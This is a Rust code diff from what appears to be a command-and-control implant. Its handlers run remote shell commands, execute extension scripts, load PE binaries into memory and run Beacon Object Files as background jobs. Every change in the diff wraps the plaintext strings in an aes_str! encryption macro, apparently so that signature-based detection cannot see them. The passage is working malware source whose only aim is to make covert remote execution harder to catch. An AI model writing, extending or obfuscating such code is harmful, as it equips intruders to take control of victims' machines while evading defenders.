@@ -12,10 +12,10 @@ use super::{HandlerContext, DispatchResult, AgentAction, lock_or_action};
 
 pub fn handle_bg(ctx: &HandlerContext, shell_cmd: &str, req_id: u64) -> DispatchResult {
     let shell_cmd = shell_cmd.to_string();
-    let desc = format!("shell: {}", &shell_cmd[..shell_cmd.len().min(60)]);
+    let desc = format!("{}: {}", aes_str!("shell"), &shell_cmd[..shell_cmd.len().min(60)]);
     let job_id = lock_or_action!(ctx.job_manager, aes_str!("job_manager")).spawn(desc, req_id, move |sink| {
         async move {
-            sink.send_chunk(&format!("[*] Running: {}", shell_cmd)).await;
+            sink.send_chunk(&format!("{}: {}", aes_str!("[*] Running"), shell_cmd)).await;
             let (out, err, code) = tokio::task::spawn_blocking(move || {
                 utils::execute_shell_command(&shell_cmd)
             }).await.unwrap_or_else(|_| (String::new(), aes_str!("Shell task panicked"), 1));
@@ -23,7 +23,7 @@ pub fn handle_bg(ctx: &HandlerContext, shell_cmd: &str, req_id: u64) -> Dispatch
             (out, err, code)
         }
     });
-    DispatchResult::Reply(format!("Job {} started", job_id), String::new(), 0, AgentAction::None)
+    DispatchResult::Reply(format!("{} {} {}", aes_str!("Job"), job_id, aes_str!("started")), String::new(), 0, AgentAction::None)
 }
 
 // ── Explicit shell ─────────────────────────────────────────────────────
@@ -57,7 +57,7 @@ pub fn handle_extension_bg(ctx: &HandlerContext, cmd: &str, req_id: u64) -> Disp
     };
 
     let ext_mgr = ctx.ext_manager.clone();
-    let desc = format!("ext: {}B script", script.len());
+    let desc = format!("{}: {}B {}", aes_str!("ext"), script.len(), aes_str!("script"));
 
     let job_id = lock_or_action!(ctx.job_manager, aes_str!("job_manager")).spawn(desc, req_id, move |sink| {
         async move {
@@ -67,13 +67,13 @@ pub fn handle_extension_bg(ctx: &HandlerContext, cmd: &str, req_id: u64) -> Disp
                     Ok(mut mgr) => mgr.run_script(&script, script_args),
                     Err(_) => aes_str!("Error: extension manager lock poisoned"),
                 }
-            }).await.unwrap_or_else(|e| format!("Task Error: {}", e));
+            }).await.unwrap_or_else(|e| format!("{}: {}", aes_str!("Task Error"), e));
             sink.send_chunk(&result).await;
             (result, String::new(), 0)
         }
     });
 
-    DispatchResult::Reply(format!("Extension launched as Job {}", job_id), String::new(), 0, AgentAction::None)
+    DispatchResult::Reply(format!("{} {}", aes_str!("Extension launched as Job"), job_id), String::new(), 0, AgentAction::None)
 }
 
 // ── In-Memory PE ───────────────────────────────────────────────────────
@@ -85,20 +85,20 @@ pub fn handle_load_pe(ctx: &HandlerContext, cmd: &str, req_id: u64) -> DispatchR
         Err(_) => return DispatchResult::Reply(String::new(), aes_str!("Invalid base64"), 1, AgentAction::None),
     };
 
-    let desc = format!("inmem:pe {}KB", pe_bytes.len() / 1024);
+    let desc = format!("{} {}KB", aes_str!("inmem:pe"), pe_bytes.len() / 1024);
     let job_id = lock_or_action!(ctx.job_manager, aes_str!("job_manager")).spawn(desc, req_id, move |sink| {
         async move {
-            sink.send_chunk(&format!("[*] Loading PE ({} bytes)...", pe_bytes.len())).await;
+            sink.send_chunk(&format!("{} ({} {})...", aes_str!("[*] Loading PE"), pe_bytes.len(), aes_str!("bytes"))).await;
             let result = tokio::task::spawn_blocking(move || {
                 unsafe { inmem::pe_loader::load_pe(&pe_bytes) }
-            }).await.unwrap_or_else(|e| Err(format!("Task Error: {}", e)));
+            }).await.unwrap_or_else(|e| Err(format!("{}: {}", aes_str!("Task Error"), e)));
             match result {
                 Ok(msg) => { sink.send_chunk(&msg).await; (msg, String::new(), 0) }
                 Err(e) => { sink.send_chunk(&format!("[-] {}", e)).await; (String::new(), e, 1) }
             }
         }
     });
-    DispatchResult::Reply(format!("PE load launched as Job {}", job_id), String::new(), 0, AgentAction::None)
+    DispatchResult::Reply(format!("{} {}", aes_str!("PE load launched as Job"), job_id), String::new(), 0, AgentAction::None)
 }
 
 // ── In-Memory BOF ──────────────────────────────────────────────────────
@@ -114,20 +114,20 @@ pub fn handle_run_bof(ctx: &HandlerContext, cmd: &str, req_id: u64) -> DispatchR
     };
     let args_bytes = if parts.len() > 2 { BASE64.decode(parts[2]).unwrap_or_default() } else { Vec::new() };
 
-    let desc = format!("inmem:bof {}KB", coff_bytes.len() / 1024);
+    let desc = format!("{} {}KB", aes_str!("inmem:bof"), coff_bytes.len() / 1024);
     let job_id = lock_or_action!(ctx.job_manager, aes_str!("job_manager")).spawn(desc, req_id, move |sink| {
         async move {
-            sink.send_chunk(&format!("[*] Running BOF ({} bytes)...", coff_bytes.len())).await;
+            sink.send_chunk(&format!("{} ({} {})...", aes_str!("[*] Running BOF"), coff_bytes.len(), aes_str!("bytes"))).await;
             let result = tokio::task::spawn_blocking(move || {
                 unsafe { inmem::bof::run_bof(&coff_bytes, &args_bytes) }
-            }).await.unwrap_or_else(|e| Err(format!("Task Error: {}", e)));
+            }).await.unwrap_or_else(|e| Err(format!("{}: {}", aes_str!("Task Error"), e)));
             match result {
                 Ok(msg) => { sink.send_chunk(&msg).await; (msg, String::new(), 0) }
                 Err(e) => { sink.send_chunk(&format!("[-] {}", e)).await; (String::new(), e, 1) }
             }
         }
     });
-    DispatchResult::Reply(format!("BOF launched as Job {}", job_id), String::new(), 0, AgentAction::None)
+    DispatchResult::Reply(format!("{} {}", aes_str!("BOF launched as Job"), job_id), String::new(), 0, AgentAction::None)
 }
 
 // ── .NET Assembly ──────────────────────────────────────────────────────
